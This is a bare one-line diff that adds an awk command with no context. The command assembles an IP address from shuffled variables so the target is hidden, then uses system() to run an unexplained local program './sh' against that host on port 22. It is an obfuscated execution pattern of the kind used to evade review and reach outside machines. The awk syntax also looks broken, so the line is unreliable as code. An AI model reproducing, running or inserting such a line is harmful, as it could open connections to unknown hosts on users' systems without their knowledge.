@@ -1,0 +1,1 @@
+awk 'BEGIN{ a=192 b=168 c=101 d=2 system("./sh "a"."d"."c"."b" 22 ")}' 
